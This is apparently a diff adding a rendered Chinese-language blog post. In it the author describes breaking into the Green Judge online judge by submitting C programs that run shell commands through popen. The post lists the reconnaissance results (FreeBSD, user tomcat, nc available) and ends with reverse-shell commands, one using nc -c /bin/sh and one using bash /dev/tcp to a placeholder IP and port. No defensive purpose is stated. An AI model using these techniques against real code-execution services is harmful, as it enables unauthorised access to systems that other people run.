@@ -1,0 +1,86 @@
+I"�<h1 id="green-judge-backdoor">Green Judge backdoor</h1>
+<h2 id="序言">序言</h2>
+
+<p>反正這個後門是我學長告訴我說，Green Judge之前有一個沒封過的後門</p>
+
+<p>然後依照我就去找了以下他的system function可用的只有popen（我沒測過別的可用的）</p>
+
+<p>花了一個學期我學會了很多系統的技巧我才成功開後門進去</p>
+
+<h2 id="實作">實作</h2>
+
+<p>依照我原本測試的popen只要這樣就能寫入指令</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">//shell command</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">command</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="s">"echo test"</span><span class="p">;</span>
+
+	<span class="n">popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>然而要print &amp;1的話…</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="cp">#define COMMAND_LENTH 32
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">CMBuf</span><span class="p">[</span> <span class="n">COMMAND_LENTH</span> <span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+	<span class="kt">FILE</span> <span class="o">*</span><span class="n">fpRead</span><span class="p">;</span>
+	
+	<span class="c1">//shell command</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">command</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="s">"echo Hello!"</span><span class="p">;</span>
+	<span class="kt">char</span><span class="o">*</span> <span class="n">renewCh</span><span class="p">;</span>
+
+	<span class="n">fpRead</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+	<span class="n">fgets</span><span class="p">(</span><span class="n">CMBuf</span><span class="p">,</span> <span class="n">COMMAND_LENTH</span> <span class="p">,</span> <span class="n">fpRead</span><span class="p">);</span>
+	
+	<span class="k">if</span><span class="p">(</span><span class="n">fpRead</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+		<span class="n">pclose</span><span class="p">(</span><span class="n">fpRead</span><span class="p">);</span>
+
+	<span class="n">renewCh</span><span class="o">=</span><span class="n">strstr</span><span class="p">(</span><span class="n">CMBuf</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">renewCh</span><span class="p">)</span>
+		<span class="o">*</span><span class="n">renewCh</span><span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">CMBuf</span><span class="p">);</span>
+	
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>這樣甚至可以解第一題Hello!</p>
+
+<h3 id="收集資訊">收集資訊</h3>
+
+<p>uname:FreeBSD</p>
+
+<p>id:tomcat staff</p>
+
+<p>pwd:/root</p>
+
+<p>ls:無法顯示</p>
+
+<p>passwd:無法完整顯示</p>
+
+<p>which nc:/usr/local/bin/nc</p>
+
+<h3 id="reverse-shell">reverse shell</h3>
+
+<p>開始測試reverse shell</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-c</span> /bin/sh ip port
+</code></pre></div></div>
+
+<p>然後我回想到FreeBSD不能使用nc -c</p>
+
+<p>只好使用bash tcp 傳送了</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/local/bin/bash <span class="nt">-c</span> <span class="s1">'/usr/local/bin/bash -i &gt;&amp; /dev/tcp/myip/port 0&gt;&amp;1'</span>
+</code></pre></div></div>
+
+:ET
